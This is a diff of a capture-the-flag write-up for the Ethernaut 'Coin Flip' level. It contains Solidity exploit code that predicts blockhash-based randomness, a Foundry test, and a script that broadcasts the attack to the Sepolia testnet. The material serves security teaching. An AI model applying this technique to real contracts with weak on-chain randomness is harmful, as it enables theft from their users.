@@ -1,12 +1,6 @@
 ## 👾 03. Coin Flip
 
 
-<br>
-  
-<p align="center">
-<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/63de48b2-4c5a-4499-b054-7fcd4a2a520d">
-</p>
-
 
 <br>
 
@@ -17,6 +11,13 @@
 
 
 * in this challenge, we exploit the determinism of a pseudo-random function composed uniquely of an EVM global accessible variable (`blockhash`) and no added entropy.
+
+<br>
+  
+<p align="center">
+<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/63de48b2-4c5a-4499-b054-7fcd4a2a520d">
+</p>
+
 
 
 <br>
@@ -65,7 +66,7 @@ contract CoinFlip {
 
 
 * the EVM is a deterministic turing machine. 
-  - since it has no inherent randomness and as everything in the contracts is publicly visible (`block.timestamp`, `block.number`, etc.), generating random numbers in solidity is non-trivial.
+  - since it has no inherent randomness and as everything in the contracts is publicly visible (*e.g.*, `block.timestamp`, `block.number`), generating random numbers in solidity is non-trivial.
   - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.
 
 <br>
@@ -133,70 +134,71 @@ if (side == _guess) {
 
 <br>
 
-* the general solution to this problem can see in the test file, `test/03/CoinFlip.t.sol`:
+
+* our exploit is located at `src/03/CoinFlipExploit.sol`:
 
 <br>
 
 ```solidity
-import "forge-std/Test.sol";
-import {CoinFlip} from "src/03/CoinFlip.sol";
+contract CoinFlipExploit {
 
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 lastBlockValue;
 
-contract CoinFlipTest is Test {
-
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    uint8 consecutiveWinsHacked = 10;
-    CoinFlip public level;
-
-    address instance = vm.addr(0x10053); 
-    address hacker = vm.addr(0x1337); 
-
-    function setUp() public {
-
-        vm.prank(instance);
-        level = new CoinFlip();
-    
-    }
-
-    /////////////////////////////////////////////////////
-    // Copy the pseudo-random function from the contract
-    ////////////////////////////////////////////////////
-    function generateSide() internal view returns (bool side) {
-
-            uint256 blockValue = uint256(blockhash(block.number - 1));
-            uint256 coinFlip = blockValue / FACTOR;
-            side = coinFlip == 1 ? true : false;
-
-     }
-
-    function testCoinFlipHack() public {
-
-        vm.startPrank(hacker);
-        assertEq(level.consecutiveWins(), 0);
-    
-        while (level.consecutiveWins() < consecutiveWinsHacked) {
-
-            /////////////////////
-            // "Flip" the coin
-            ////////////////////
-            level.flip(generateSide());
-
-            ////////////////////////////
-            // Simulate the next block
-            ////////////////////////////
-            vm.roll(block.number + 1);
-
+    function run(CoinFlip level) public {
+        uint256 blockNumber = uint256(blockhash(block.number - 1));
+        if (blockNumber == lastBlockValue) {
+            return;
         }
-
-        assertEq(level.consecutiveWins(), consecutiveWinsHacked);
-        vm.stopPrank();
-
-      }
+        uint256 coinFlip = blockNumber / FACTOR;
+        bool coinSide = coinFlip == 1 ? true : false;
+        level.flip(coinSide);
+        lastBlockValue = blockNumber;
+    }
+}
 ```
 
 <br>
 
-* which can be run with:
+* which can be tested with `test/03/CoinFlip.t.sol`:
+
+<br>
+
+```solidity
+contract CoinFlipTest is Test {
+
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 private immutable FIRST_BLOCK = 137;
+    uint8 consecutiveWins = 10;
+    address instance = vm.addr(0x1); 
+    address hacker = vm.addr(0x2); 
+    CoinFlip public level;
+
+    function setUp() public {
+        vm.prank(instance);
+        level = new CoinFlip();
+        assertEq(level.consecutiveWins(), 0);
+    }
+
+    function testCoinFlipHack() public {
+        vm.startPrank(hacker);
+        vm.roll(FIRST_BLOCK);
+
+        CoinFlipExploit exploit = new CoinFlipExploit();
+        for (uint256 i = FIRST_BLOCK; i < FIRST_BLOCK + consecutiveWins; i++) {
+            vm.roll(i + 1); 
+            exploit.run(level);
+        }
+
+        assert(level.consecutiveWins() == consecutiveWins);
+        vm.stopPrank();
+      }
+}
+```
+
+<br>
+
+* running with:
 
 <br>
 
@@ -209,48 +211,36 @@ contract CoinFlipTest is Test {
 <br>
 
 
-* because this time i wanted to run a loop in the deployment script, i moved the exploit logic to its own contract inside `src/03/CoinFlipExploit.sol`:
 
-<br>
-
-```solidity
-contract CoinFlipExploit {
-
-    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    CoinFlip public level;
-
-    constructor(address _levelInstance) {
-        level = CoinFlip(_levelInstance);
-    }
-
-    function run() public returns (bool guess) {
-
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        bool side = blockValue / FACTOR == 1 ? true : false;
-        guess = level.flip(side);
-    
-    }
-}
-```
-
-<br>
-
-
-* which could be called within `script/03/CoinFlip.s.sol`:
+* to submit the solution, we run `script/03/CoinFlip.s.sol`:
 
 <br>
 
 ```solidity
 contract Exploit is Script {
 
-    CoinFlipExploit exploit = new CoinFlipExploit(instance);
     uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint8 private immutable consecutiveWins = 10;
     address instance = vm.envAddress("INSTANCE_LEVEL3"); 
     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
- 
+    
+
     function run() public {
         vm.startBroadcast(hacker);
-        exploit.run();
+
+        CoinFlip level = CoinFlip(instance);
+        CoinFlipExploit exploit = new CoinFlipExploit();
+        
+        vm.roll(block.number - consecutiveWins);
+        
+        for (uint256 i = 1; i < consecutiveWins + 1; i++) {
+            uint256 lastBlockNumber = block.number;
+            vm.roll(lastBlockNumber + 1);
+            exploit.run(level);
+        }
+
+        console.log(level.consecutiveWins());
+
         vm.stopBroadcast();
     }
 }
@@ -258,53 +248,13 @@ contract Exploit is Script {
 
 <br>
 
-* by running:
+* with:
 
 <br>
 
 ```shell
 > forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia
 ```
-
-
-<br>
-
-* initially, i wanted to have `exploit.run();` in a loop like this:
-
-<br>
-
-
-```solidity
-uint256 count = 0;
-do {
-    exploit.run();
-    ++count;
-} while (count < GUESSES);
-```
-
-<br>
-
-* however this never worked, and i suspected it's because of the `lastHash` check in `CoinFlip`.
-  - i originally thought this check would require each new guess submission to occur after 12 seconds (the time it takes for a new proof-of-stake block to be minted):
-
-
-<br>
-
-```solidity
-if (lastHash == blockValue) {
-  revert();
-}
-
-lastHash = blockValue;
-```
-
-
-<br>
-
-* but it didn't matter whether i was running with the loop or manually (with, say, `while sleep 12; do forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia; done`).
-  - this solution never really worked (even though i spent a few hours trying to find the bug). 
-  - a bit frustrating because this solution was foundry-native and symmetric with the previous problems.
-  - i decided i had to try a new approach... using an `interface`.
 
 
 
